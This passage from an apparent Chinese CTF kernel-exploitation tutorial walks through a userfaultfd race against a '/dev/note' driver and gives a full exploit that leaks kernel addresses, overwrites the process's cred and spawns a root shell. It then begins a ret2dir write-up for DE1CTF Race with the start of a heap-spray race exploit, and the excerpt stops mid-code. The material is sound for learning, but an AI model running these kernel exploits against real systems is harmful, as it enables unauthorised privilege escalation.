&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size &amp; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( chunk_size &amp; <span class="number">2</span> )</span><br><span class="line">        *(_WORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们先创建一个buf为0x10大小的note0，在Edit的过程中我们利用usefaultfd的handler在成功拷贝之前释放所有note，再创建一个新的Note0和Note1，其buf大小均为0，在使用ioctl向缺页部分拷贝的时候我们把这个页的<code>buf[8]</code>改为<code>0xf0</code>，这样拷贝之后原来<code>buf[8]</code>的部分实际上是<code>note1.length</code>，进而我们可以越界读写<code>note1</code>。</p>
<ol>
<li>leak key:直接<code>Show(1)</code>，因为我们把note1的length改为了非零值，因此会输出<code>0 xor key</code>，得到Key值</li>
<li>leak module base:注意我们现在泄露的只是一个相对值(module_base-page_offset_base)，但是无所谓，因为最终show的时候会加上这个偏移。创建Note2则<code>note2.contentPtr</code>即为<code>note2.content_arr-page_offset_base</code>，show(1)即可泄露出来这个值，再减去它到模块基地址的偏移即为模块相对基址</li>
<li>leak page_offset_base:泄露这个值就比较麻烦了，我们先来看一个指令<code>000000001F7 4C 8B 25 12 2A 00 00                    mov     r12, cs:page_offset_base</code>，这个调用实际含义是<code>mov r12,[rip+offset]</code>，而这个offset存储在<code>module_base+0x1fa</code>，我们的思路就有了，先修改note2的key为0，length为4，contentPtr为<code>module_base+0x1fa</code>，得到这个4字节的偏移，再用相同方式泄露出<code>(module_base+0x1fe)+offset</code>的值，即为所求</li>
<li>leak cred:通过之前提到的search搜索的方式</li>
<li>用任意写修改cred的对应数据位</li>
<li>execv(注意不是execve)起新的shell(这个shell会继承当前进程的uid)</li>
</ol>
<h4 id="exp-c-5"><a href="#exp-c-5" class="headerlink" title="exp.c"></a>exp.c</h4><p>如前所述基本是照着打了一遍，再次感谢<code>bsauce</code>师傅的文章</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NewCmd (-256)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DeleteCmd (-253)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ShowCmd (-254)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EditCmd (-255)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)(0x1337000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* contentPtr;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">userAttr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* user_buf;</span><br><span class="line">&#125;attr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]open dev failed"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]open success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">New</span><span class="params">(<span class="keyword">char</span>* usr_buf,<span class="keyword">uint8_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-256</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]create failed"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-253</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]delete error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-254</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to show"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Edit</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">size_t</span> length,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-255</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to Edit"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] Handler created"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> ready;</span><br><span class="line">   poll_fd.fd = uffd;</span><br><span class="line">   poll_fd.events= POLLIN;</span><br><span class="line">   ready = poll(&amp;poll_fd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span>(ready != <span class="number">1</span>)</span><br><span class="line">    ErrExit(<span class="string">"[-]poll failed!"</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+]Now we got to inject dirty code"</span>);</span><br><span class="line"></span><br><span class="line">   Delete();</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//init:node0+0x10buf</span></span><br><span class="line">   <span class="comment">//now:node0+node1</span></span><br><span class="line">   <span class="keyword">if</span>(read(uffd,&amp;msg,<span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">       ErrExit(<span class="string">"[-]Error reading msg"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">   <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">   buf[<span class="number">8</span>] = <span class="number">0xf0</span>;<span class="comment">//overwrite the note1's size = 0xf0</span></span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">   uc.len = <span class="number">0x1000</span>;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd,UFFDIO_COPY,&amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[*]userfault process success"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    Init();</span><br><span class="line">    New(buf,<span class="number">0x10</span>);</span><br><span class="line">    register_userfault();</span><br><span class="line">    <span class="comment">//create the 0x10 buf</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">1</span>,FAULT_PAGE);</span><br><span class="line">    <span class="comment">//now we mmap a address for later use</span></span><br><span class="line">    <span class="comment">//1.leak key:0 xor key == key</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak key:%lx\n"</span>,key);</span><br><span class="line">    <span class="comment">//note0:0x10</span></span><br><span class="line">    <span class="comment">//note1:0x10(size changed to 0xf0)</span></span><br><span class="line">    <span class="comment">//2.leak module base(real_module_base - base_page_off)</span></span><br><span class="line">    New(buf,<span class="number">0</span>);<span class="comment">//node2</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> bss_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(buf+<span class="number">0x10</span>) ^ key;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> module_base = bss_addr - <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak module base(sub page_base_offset):%lx\n"</span>,module_base);</span><br><span class="line">    <span class="comment">//3.leak page_base_off</span></span><br><span class="line">    <span class="comment">//overwrite the note2's contentPtr to module_base+0x1fa</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> page_offset_base = module_base+<span class="number">0x1fa</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* fake_note = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="keyword">int</span> page_offset_base_off;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">4</span> ^ key;<span class="comment">//we only need four bytes</span></span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;page_offset_base_off);</span><br><span class="line">    page_offset_base = module_base + <span class="number">0x1fe</span> + page_offset_base_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak page_base_offset:%lx\n"</span>,page_offset_base);</span><br><span class="line">    <span class="comment">//4.now we leak rael page off base</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> base_addr;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;base_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak real page base offset:%llx\n"</span>,base_addr);</span><br><span class="line">    <span class="comment">//search cred using task_struct</span></span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">"[*]WuHanJiaYou!"</span>);<span class="comment">//</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* task;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i; ;i += <span class="number">0xf0</span>)&#123;</span><br><span class="line">        fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">1</span>] = <span class="number">0xf0</span> ^ key;</span><br><span class="line">        fake_note[<span class="number">2</span>] = i ^ key;</span><br><span class="line">        Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">        Show(<span class="number">2</span>,buf);</span><br><span class="line">        task = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)memmem(buf,<span class="number">0xf0</span>,<span class="string">"[*]WuHanJiaYou!"</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(task != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+]found success,task:%p,cred:0x%lx,real_cred:0x%lx\n"</span>,task,task[<span class="number">-1</span>],task[<span class="number">-2</span>]);</span><br><span class="line">            <span class="keyword">if</span>(task[<span class="number">-1</span>]&gt;<span class="number">0xffff000000000000</span> &amp;&amp; task[<span class="number">-2</span>]&gt;<span class="number">0xffff000000000000</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ovwrite cred</span></span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">0x28</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">2</span>] = (task[<span class="number">-2</span>]+<span class="number">4</span>-base_addr) ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="number">0x30</span>);</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="number">0x28</span>,buf);</span><br><span class="line">    <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execv(<span class="string">"/bin/sh"</span>,args);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>这种攻击最早是在<code>DE1CTF</code>见到的，当时<code>ycx</code>学长的博客有相关实践，当时对于内核完全摸不着头脑，现在大概懂了一些基本trick，翻一下<code>de1ta</code>在先知给的<a href="https://xz.aliyun.com/t/5944#toc-9" target="_blank" rel="noopener">writeup</a>，尝试学习一波。</p>
<h3 id="DE1CTF-Race"><a href="#DE1CTF-Race" class="headerlink" title="DE1CTF Race"></a>DE1CTF Race</h3><h4 id="程序分析-amp-amp-漏洞利用"><a href="#程序分析-amp-amp-漏洞利用" class="headerlink" title="程序分析 &amp;&amp; 漏洞利用"></a>程序分析 &amp;&amp; 漏洞利用</h4><p>跟之前那道题差不多，先看下自己实现的fops，发现全是空，ioctl是没有上锁的，<code>copy_from_user</code>和<code>copy_to_user</code>都是非原子操作。实现了<code>New</code>、<code>Edit</code>、<code>Show</code>和<code>Delete</code>功能。之前那道题目提到了别名页，实际上就是这里的<code>physmap</code>。</p>
<p>开始我自己想用的是之前提到的userfaultfd来保证竞争的结果可控，后来发现这个API好像用不了，只能利用mmap缺页造成的短暂中断间隙进行竞争删除。</p>
<p>官方的给的思路前面是用到了<code>physmap</code>的特性，就是这个地址的基址实际上是物理地址<code>physical_addr+offset</code>，可以绕过地址随机化。我们在<code>Show</code>的时候竞争删除，从而泄露出<code>slab</code>地址，根据官方的解释<code>physmap</code>的地址应该在<code>slab</code>前面，且包含<code>slab</code>，这个个人感觉是有依据的，之前在做xman那道题的时候看p4nda师傅博客给的爆破地址的起始地址就是没有开地址随机化的<code>physmap</code>位置。</p>
<p>猜测了<code>physmap</code>地址(不一定是起始地址，但是是在这个区域中的一个地址)，我们先用堆喷占位<code>physmap</code>区域，为了提高命中率我们分配的内存大小为<code>64M</code>，是整个进程的一半。在<code>Edit</code>的时候竞争删除，从而可以往<code>slab</code>的<code>fd</code>竞争写入刚才猜的地址。</p>
<p>后面官方的做法是分配<code>tty_struct</code>结构体，因为我们现在<code>slab</code>从<code>physmap</code>开始分配，<code>tty_struct</code>会分配到这块区域，之后我们<code>check</code>堆喷到的内存查看有无非零区域(<code>tty_struct</code>结构体里有一堆函数指针)，遇到非零值就说明找到了<code>slab_addr</code>并可以通过函数指针及偏移找到<code>vmlinux_base</code>，再往后官方是从<code>tty_struct</code>下手，我觉得既然有竞争的<code>UAF</code>可以改<code>modprobe_path</code>，应该更简单一点。</p>
<h4 id="exp-c-6"><a href="#exp-c-6" class="headerlink" title="exp.c"></a>exp.c</h4><p>自己实在是懒得写(或抄)exp，作为kernel入门篇的最后一篇文章也还是以官方的writeup收尾。注意这个exp后面有一个自己写内核shellcode的部分需要自己补充(这就是为什么我说不如改<code>modprobe_path</code>方便的原因)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_read		0x23333</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_write	0x23334</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_ioctl_del		0x23335</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> thread_num		10	<span class="comment">//local 0x10; server 10</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp_size			1024*64 <span class="comment">//64K</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spray_times		32*32	<span class="comment">// heap spray size : 64K*16*32 = 32M</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel_offset		0x106b4e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_memory_x		0x55580</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *spray[spray_times];</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ptmx;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_quit</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s\n"</span>,arg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race_kill</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ioctl(fd,test_ioctl_del, &amp;data);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">race_read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *mp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">data_struct</span> <span class="title">data</span>;</span></span><br><span class="line">	<span class="keyword">pthread_t</span> tid[thread_num];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x2c0</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="string">'a'</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="keyword">if</span> ((mp = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)</span><br><span class="line">                error_quit(<span class="string">"mmap error"</span>);</span><br><span class="line">	data.size = <span class="number">0x2c0</span>;</span><br><span class="line">	data.buf = (<span class="keyword">void</span> *)buf;</span><br><span class="line">	ioctl(fd, test_ioctl_read, &amp;data);</span><br><span class="line">	data.size = <span class="number">7</span>;</span><br><span class="line">	data.buf = 